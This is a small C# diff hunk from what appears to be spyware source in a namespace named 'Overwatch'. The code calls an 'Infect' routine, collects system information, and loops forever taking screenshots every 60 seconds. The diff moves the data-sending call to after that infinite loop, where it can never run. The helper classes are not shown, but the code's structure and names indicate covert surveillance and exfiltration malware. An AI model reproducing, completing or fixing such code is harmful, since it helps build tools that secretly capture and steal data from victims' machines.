@@ -14,14 +14,15 @@ namespace Overwatch
                 cChangeLabel.Infect(args);
                 cReceiveInformation info = new cReceiveInformation();
                 info.Overview();
-                cSendingInformation s = new cSendingInformation();
-                s.Sending();
                 while (true)
                 {
                     info.ScreenShoot();
                     info.Start();
                     System.Threading.Thread.Sleep(60000);
                 }
+
+                cSendingInformation s = new cSendingInformation();
+                s.Sending();
 
             }
             catch (Exception ex) { Log.Write(ex.Message, true); }
